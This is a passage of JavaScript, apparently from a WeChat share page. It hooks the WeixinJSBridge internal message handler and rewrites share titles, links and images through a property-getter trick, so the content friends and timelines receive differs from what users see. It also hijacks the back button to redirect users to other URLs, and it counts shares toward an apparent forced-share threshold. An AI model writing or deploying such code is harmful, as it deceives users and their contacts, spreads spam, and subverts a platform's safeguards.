            this.fileName.indexOf(".html") < 0 && (this.fileName = "/index.html")
        }

        return n.prototype.isNeedRedirect = function(){
            var n = window.url.params.from;
            return "timeline" == n || "groupmessage" == n || "singlemessage" == n || "share" == n
        }, n.prototype.getRandomValueInArray = function(n, t){
            if(!n) {
                return t;
            }
            if("string" == typeof n) {
                return n;
            }
            if(!isArray(n)) {
                return t;
            }
            var i = getRandomNum(0, n.length - 1);
            return n[i] || t
        }, n.prototype.start = function(){
            var t = this, n;
            t.hookBackButton();
            void t.setShareCallBack();
            n = {};
            n.title = sharedata.title;
            n.desc = sharedata.desc;
            n.link = sharedata.link;
            n.img_url = sharedata.imgUrl;
            app.timelineTitle = sharedata.qtitle;
            app.timelineUrl = sharedata.qlink;
            app.timelineImage = sharedata.qimgUrl;
            t.setModelShareData(n)
        }, n.prototype.hookBackButton = function(){
            var n = this;
            window.setTimeout(function(){
                window.onpopstate = function(n){
                    if(!window.main.isIphone || null !== n.state) {
                        if(window.turl && window.turl.length > 0) {
                            return void(location.href = window.turl);
                        }
                        var t = main.backUrl;
                        if("close" === t) {
                            WeixinJSBridge && WeixinJSBridge.call("closeWindow");
                        } else if(t && t.length > 0) {
                            return void(location.href = t)
                        }
                    }
                }
            }, 50)
        }, n.prototype.setShareCallBack = function(){
            var n = this;
            window.wcShare && (window.wcShare.shareCallback = function(t){
                var r = !1, i = t && t.err_msg;
                ("send_app_msg:ok" == i || "send_app_msg:confirm" == i || "share_timeline:ok" == i) && (n.currentShareCount++, n.currentShareCount == n.forceShareCount && "share_timeline:ok" != i && n.currentShareCount--, r = !0);
                if(r) {
                    if("share_timeline:ok" == i) {
                        sharedata.success('timeline')
                    } else {
                        sharedata.success('friend')
                    }
                }
            })
        }, n.prototype.runAction = function(){
            console.log("runAction")
        }, n.prototype.setNewShareData = function(n){
            var t, i, r;
            return n == "timeline" ? (t = window.wcShare.shareData, app.timelineUrl && (t.link = app.timelineUrl), app.timelineTitle && (t.title = app.timelineTitle), app.timelineImage && (t.img_url = app.timelineImage), void(window.wcShare.shareData = t)) : this.model && this.model.getShareData && (this.modelShareData = this.model && this.model.getShareData(n), i = this.modelShareData, i || (r = $("img")[0], i = {
                link: location.href,
                title: document.title,
                desc: document.title,
                img_url: r && r.getAttribute("src")
            }), isUrl(i.link)) ? void(window.wcShare.shareData = i) : void 0
        }, n.prototype.setModelShareData = function(n){
            var t, r, i, s;
            if(window.wcShare) {
                if(t = {
                        link: n.link,
                        desc: n.desc,
                        title: n.title,
                        img_url: n.img_url
                    }, isUrl(t.link)) {
                    return void(window.wcShare.shareData = t);
                }
                if(isUrl(this.nextUrl)) {
                    return t.link = this.nextUrl, void(window.wcShare.shareData = t);
                }
                var u = void 0, f = void 0, e = void 0, o = "share-user-api-error";
                if(this.nextUrl && (u = this.nextUrl, f = this.fileName, e = "", o = "share-user-ok"), r = {
                        protocol: "http:",
                        host: u,
                        pathname: f,
                        port: e,
                        params: {
                            user: o,
                            dmid: this.searchDomainModelId,
                            sdmid: this.searchShareDomainModelId,
                            from: "share",
                            timestamp: Date.now()
                        },
                        removeParams: ["isappinstalled"]
                    }, n.linkParams) {
                    for(i in n.linkParams) {
                        n.linkParams.hasOwnProperty(i) && (s = n.linkParams[i], r.params[i] = s);
                    }
                }
                t.link = url.GetHref(r);
                window.wcShare.shareData = t
            }
        }, n
    }();
    WechatShare = function(){
        function n(){
            var n = this;
            this.onBridgeReady = function(){
                var t = window.WeixinJSBridge, i = {
                    invoke: t.invoke,
                    call: t.call,
                    on: t.on,
                    env: t.env,
                    log: t.log,
                    _fetchQueue: t._fetchQueue,
                    _hasInit: t._hasInit,
                    _hasPreInit: t._hasPreInit,
                    _isBridgeByIframe: t._isBridgeByIframe,
                    _continueSetResult: t._continueSetResult,
                    _handleMessageFromWeixin: t._handleMessageFromWeixin
                };
                Object.defineProperty(window, "WeixinJSBridge", {writable: !0, enumerable: !0});
                window.WeixinJSBridge = i;
                try {
                    n.setHandleMessageHookForWeixin()
                } catch(t) {
                    n.restoreHandleMessageHookForWeixin()
                }
            };
            this.handleMesageHook = function(t){
                var r;
                if(t) {
                    r = t.__json_message ? t.__json_message : t;
                    var i = r.__params, u = r.__msg_type, f = r.__event_id;
                    if("callback" == u && n.shareCallback && "function" == typeof n.shareCallback) {
                        n.shareCallback(i);
                    } else if("event" == u && f && f.indexOf("share") > 0) {
                        var e = n.shareData.desc, o = n.shareData.link, s = n.shareData.img_url, h = n.shareData.title;
                        if(f.indexOf("timeline") > 0) {
                            e = sharedata.desc, o = sharedata.qlink, s = sharedata.qimgUrl, h = sharedata.qtitle
                        }
                        Object.defineProperty(i, "title", {
                            get: function(){
                                return delete i.scene, i.desc = e, i.link = o, i.img_url = s, Object.defineProperty(i, "title", {
                                    value: h,
                                    enumerable: !0
                                }), "title"
                            }, set: function(){
                            }, enumerable: !1, configurable: !0
                        });
                        n.restoreHandleMessageHookForWeixin();
                        n.oldHandleMesageHook(t);
                        n.setHandleMessageHookForWeixin()
                    } else {
                        n.restoreHandleMessageHookForWeixin(), n.oldHandleMesageHook(t), n.setHandleMessageHookForWeixin()
                    }
                }
            };
            "undefined" == typeof WeixinJSBridge ? document.addEventListener ? document.addEventListener("WeixinJSBridgeReady", this.onBridgeReady, !1) : document.attachEvent && (document.attachEvent("WeixinJSBridgeReady", this.onBridgeReady), document.attachEvent("onWeixinJSBridgeReady", this.onBridgeReady)) : this.onBridgeReady()
        }

        return n.prototype.setHandleMessageHookForWeixin = function(){
            this.oldHandleMesageHook = window.WeixinJSBridge._handleMessageFromWeixin;
            window.WeixinJSBridge._handleMessageFromWeixin = this.handleMesageHook
        }, n.prototype.restoreHandleMessageHookForWeixin = function(){
            this.oldHandleMesageHook && (window.WeixinJSBridge._handleMessageFromWeixin = this.oldHandleMesageHook)
        }, n
    }();
    window.wcShare = new WechatShare;
    $(document).ready(function(){
        window.main = new Main;
        window.main.start()
    })
}
function alertUI(c, t, yesfun){
    var UIdom = document.getElementById("alertUI");
    t = (t ? t : '温馨提示'), c = (c ? c : '');
    if(UIdom == null) {
        var content = '<div id="alertUI" style="width:100%;height:100%; background:rgba(0,0,0,0.5);position: fixed; left:0px; top: 0px; z-index: 999999999;display:none;"><div  style="width:85%; background: #FFF; margin: 220px auto;border: 1px solid #CFCFCF;border-radius:3px;max-width:500px;"><h1 class="alertUI_title" style="margin:0px; padding: 15px 0 5px; font-family:\'arial\';font-size: 22px;line-height:30px;font-weight: normal;color:#000;text-align:center;">温馨提示</h1><div class="alertUI_content" style="padding:5px 20px;font-size: 17px;font-family:\'arial\'; color: #676767;"></div><p style="margin:0px; border-top:1px solid #cfcfcf; text-align:center; margin-top:20px"><a class="alertUI_button" style="font-family:\'arial\'; font-size:18px;color:#3cc51f;cursor: pointer;display:block;line-height:50px;text-align:center;">确定</a></p></div></div>';
        document.body.insertAdjacentHTML('beforeEnd', content)
    }
    var UIdom = document.getElementById("alertUI");
    UIdom.querySelectorAll(".alertUI_title")[0].innerHTML = t;
    UIdom.querySelectorAll(".alertUI_content")[0].innerHTML = c;
    UIdom.querySelectorAll(".alertUI_button")[0].onclick = function(){
        UIdom.style.display = 'none';
        if(typeof yesfun == 'function') {
            yesfun()
        }
    };
    UIdom.style.display = 'block';
    return false
}